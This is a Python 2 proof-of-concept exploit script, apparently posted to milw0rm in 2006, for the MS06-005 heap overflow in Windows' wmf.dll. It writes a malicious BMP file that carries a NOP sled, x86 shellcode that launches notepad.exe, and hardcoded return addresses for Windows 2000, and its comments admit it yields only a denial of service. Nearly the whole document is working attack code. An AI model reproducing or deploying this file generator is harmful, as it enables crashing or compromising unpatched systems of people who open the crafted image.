# sploit creater by redsand@blacksecurity.org
# ms06-005 advisory proof of concept
# heap overflow in wmf.dll @ 0x0035920a
# denial of service, cuz we can't get this to play nice
    
#shamelessly stolen from CANVAS code
def intel_order(i):
    str=""
    a=chr(i % 256)
    i=i >> 8
    b=chr(i % 256)
    i=i >> 8
    c=chr(i % 256)
    i=i >> 8
    d=chr(i % 256)
    
    str+="%c%c%c%c" % (a,b,c,d)

    return str

def stroverwrite(instring,overwritestring,offset):
    head=instring[:offset]
    #print head
    tail=instring[offset+len(overwritestring):]
    #print tail
    result=head+overwritestring+tail
    return result


#options
#SEH HAndle

#anything with a call/jmp  edi/ecx + 4 or more
EIP=0x75e1692c # call edi +20 for win2k pro eng in oleaut
DUMMY=0xccccccccL
filename = "rbl4ck-06-005.bmp"

header =  "\x42\x4d\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x28\x00"
header += "\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x04\x00\x00\x00"
header += "\x00\x00\x00\x01\x00\x00\x01\x00\x00\x00\x01\x00\x04\x00\x00\x00"
header += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xCC"

c0de    = "\x90" * 350
c0de    +=  "\xCD\x03" 
c0de    += "\xEB\x61\x56\x6A\x30\x59\x64\x8B\x01\x8B\x40\x0C"
c0de    += "\x8B\x70\x1C\xAD\x8B\x40\x08\x5E\xC3\x60\x8B\x6C"
c0de    += "\x24\x24\x8B\x45\x3C\x8B\x54\x05\x78\x01\xEA\x8B"
c0de    += "\x4A\x18\x8B\x5A\x20\x01\xEB\xE3\x34\x49\x8B\x34"
c0de    += "\x8B\x01\xEE\x31\xFF\x31\xC0\xFC\xAC\x84\xC0\x74"
c0de    += "\x07\xC1\xCF\x0D\x01\xC7\xEB\xF4\x3B\x7C\x24\x28"
c0de    += "\x75\xE1\x8B\x5A\x24\x01\xEB\x66\x8B\x0C\x4B\x8B"
c0de    += "\x5A\x1C\x01\xEB\x8B\x04\x8B\x01\xE8\x89\x44\x24"
c0de    += "\x1C\x61\xC3\xE8\x9A\xFF\xFF\xFF\x68\x98\xFE\x8A"
c0de    += "\x0E\x50\xE8\xA2\xFF\xFF\xFF\xEB\x02\xEB\x05\xE8"
c0de    += "\xF9\xFF\xFF\xFF\x5B\x83\xC3\x1C\x33\xC9\x88\x0B"
c0de    += "\x83\xEB\x0B\x41\x51\x53\xFF\xD0\x90\x6E\x6F\x74"
c0de    += "\x65\x70\x61\x64\x2E\x65\x78\x65\x01"
#tag
c0de    += "0wn3dbyr3ds4nd"

for on in range(256):
    c0de += intel_order(EIP-80)

body = ""
r=0x88888800L
for on in range(235):
    r+=0x01L
    body += intel_order(r)

    
body    += c0de

body = stroverwrite(body,intel_order(EIP-4),56)
body = stroverwrite(body,intel_order(EIP),96)
body = stroverwrite(body,intel_order(EIP),160)
body = stroverwrite(body,intel_order(EIP-0x3c),708)
body = stroverwrite(body,intel_order(EIP),828)
body = stroverwrite(body,intel_order(EIP),868)
body = stroverwrite(body,intel_order(EIP),936)
#
#here's our call eax+4
body = stroverwrite(body,intel_order(EIP-4),948)
#
#
body = stroverwrite(body,intel_order(EIP),300)





print "MS06-005 Heap Overflow by redsand [at] blacksecurity.org"
print "Writing filename " + filename + "..."

try:                                
    fsock = open(filename, "wb+", 0) 
    try:                           
        fsock.write(header + body ); 
    finally:                        
        fsock.close()
except IOError:                     
    pass


print "success."

# milw0rm.com [2006-02-16]
